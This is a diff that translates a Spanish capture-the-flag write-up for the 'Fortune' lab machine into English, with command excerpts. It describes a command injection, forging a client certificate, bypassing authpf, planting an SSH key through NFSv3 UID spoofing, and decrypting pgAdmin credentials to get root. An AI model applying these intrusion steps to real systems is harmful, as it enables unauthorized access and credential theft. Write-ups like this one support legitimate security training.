@@ -1,6 +1,6 @@
 ﻿# Writeup: Fortune
 
->Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:
+>First, we carried out an Nmap scan of the victim machine's TCP ports:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
@@ -16,7 +16,7 @@ PORT    STATE SERVICE    VERSION
 443/tcp open  ssl/https?
 ```
 
->Realizamos un escaneo con Whatweb en las dos webs para ver sus tecnologías empleadas:
+>We ran a scan using Whatweb on both websites to see which technologies they use:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
@@ -28,21 +28,21 @@ http://10.129.34.122 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[OpenBSD h
 ERROR Opening: https://10.129.34.122 - SSL_read: tlsv13 alert certificate required (SSL alert number 116)
 ```
 
->Esta es la página web principal en el puerto TCP 80:
+>This is the main web page on TCP port 80:
 
 <img width="594" height="230" alt="image" src="https://github.com/user-attachments/assets/bb47306e-80dc-4955-9e46-fa8203f3e748" />
 
->Vemos que es vulnerable a Command Injection al concatenar un comando empleando ";":
+>We can see that it is vulnerable to command injection when concatenating a command using `;`:
 
 <img width="1318" height="573" alt="image" src="https://github.com/user-attachments/assets/9e62becf-b041-47fe-bd2a-bef9db472693" />
 
->Leemos los dos certificados que vemos en el directorio y los copiamos en local:
+>We read the two certificates shown in the directory and copy them to our local machine:
 
 <img width="1255" height="603" alt="image" src="https://github.com/user-attachments/assets/d941fff9-8cb0-4672-8012-a33e0823ede8" />
 
 <img width="1244" height="610" alt="image" src="https://github.com/user-attachments/assets/16ea1fbf-1cb0-4e74-88ce-1b367d4dc63c" />
 
->Con esto, vamos a crear un certificado de cliente para poder acceder a la web que hay en el puerto 443, ya que sin este, no podríamos acceder:
+>With this, we are going to create a client certificate so that we can access the website on port 443, as without it we would not be able to access it:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
@@ -81,23 +81,23 @@ Enter Export Password:
 Verifying - Enter Export Password:
 ```
 
->Lo agregamos a firefox en el apartado security > View my Certificates > Your Certificates :
+>We added it to Firefox under the Security section > View my Certificates > Your Certificates:
 
 <img width="604" height="418" alt="image" src="https://github.com/user-attachments/assets/8bcb443e-1ec6-409e-b969-29d04caf8246" />
 
->Accedemos a la página web por HTTPS y vemos lo siguiente:
+>We access the website via HTTPS and see the following:
 
 <img width="1457" height="98" alt="image" src="https://github.com/user-attachments/assets/9a717176-0dc2-42c0-9616-f7cc56e19699" />
 
->Obtenemos la clave authpf de un usuario:
+>We retrieve a user's authpf key:
 
 <img width="1475" height="600" alt="image" src="https://github.com/user-attachments/assets/1b5f63ba-cee2-4866-81b4-a2b32986b094" />
 
->Si vemos el /etc/passwd podemos ver que podemos acceder con la clave como el user nfsuser probablemente ya que tiene como shell `/usr/sbin/authpf`:
+>If we look at the /etc/passwd file, we can see that we can log in using the password associated with the user nfsuser, as this is likely the case given that their shell is set to `/usr/sbin/authpf`:
 
 <img width="1267" height="581" alt="image" src="https://github.com/user-attachments/assets/6b9a4f14-8d15-40a4-8ad1-90dcbd5b1a48" />
 
->Accedemos con la clave, esto nos permitirá evadir el firewall ya que esta conexión entablada deshabilita el packet filter:
+>We log in using the password; this will allow us to bypass the firewall, as this established connection disables the packet filter:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
@@ -111,7 +111,7 @@ Warning: Permanently added '10.129.34.122' (ED25519) to the list of known hosts.
 Hello nfsuser. You are authenticated from host "10.10.14.71"
 ```
 
->Volvemos a realizar un escaneo por nmap ahora que el firewall no nos molesta:
+>We'll run another nmap scan now that the firewall isn't getting in the way:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
@@ -131,7 +131,7 @@ PORT     STATE SERVICE          VERSION
 8081/tcp open  blackice-icecap?
 ```
 
->Vemos que hay una share por NFS llamada home disponible para todo el mundo:
+>We can see that there is an NFS share called **home** available to everyone:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
@@ -140,7 +140,7 @@ Export list for 10.129.34.122:
 /home (everyone)
 ```
 
->Lo montamos:
+>We'll mount it:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
@@ -151,7 +151,7 @@ Export list for 10.129.34.122:
 Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' → '/usr/lib/systemd/system/rpc-statd.service'.
 ```
 
->Contenido:
+>Content:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/fortune/nfs]
@@ -199,7 +199,7 @@ Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' �
 └── nfsuser
 ```
 
->Primera flag:
+>First flag:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/fortune/nfs]
@@ -207,7 +207,7 @@ Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' �
 ada0affd040090a6daede65f10737c40
 ```
 
->Vamos a agregar al authorized keys de charlie nuestra clave pública ya que nuestro usuario kali tiene el UID 1000 que coincide con el de charlie y debido a que usamos la versión 3 de NFS al montar la share podemos emplear estre truco para acceder y modificar archivos sin estar autorizados realmente:
+>We're going to add our public key to Charlie's authorised keys, as our user kali has the UID 1000, which matches Charlie's, and because we're using NFS version 3, when mounting the share we can use this trick to access and modify files without actually being authorised:
 
 ```bash
 ┌──(root㉿jbkira)-[/home/kali/Desktop/machines/fortune]
@@ -253,7 +253,7 @@ Welcome to OpenBSD: The proactively secure Unix-like operating system.
 fortune$
 ```
 
->Obtenemos el archivo de bases de datos de pgadmin4:
+>We retrieve the database file from pgAdmin4:
 
 ```bash
 bash-5.1$ pwd
@@ -262,7 +262,7 @@ bash-5.1$ python3 -m http.server 10000
 Serving HTTP on 0.0.0.0 port 10000 (http://0.0.0.0:10000/) ...
 ```
 
->Vemos credenciales en la tabla user:
+>We can see credentials in the user table:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
@@ -283,7 +283,7 @@ sqlite> select * from user;
 2|bob@fortune.htb|$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg|1|
 ```
 
->Usamos el siguiente script para desencriptarla:
+>We used the following script to decrypt it:
 
 ```python
 from Crypto.Cipher import AES
@@ -327,7 +327,7 @@ print(decrypt(ct, k))
 R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
 ```
 
->Usamos las credenciales para loguearnos como root en la sesión de ssh y leemos la flag final:
+>We use the credentials to log in as root via SSH and read the final flag:
 
 ```bash
 bash-5.1$ su root
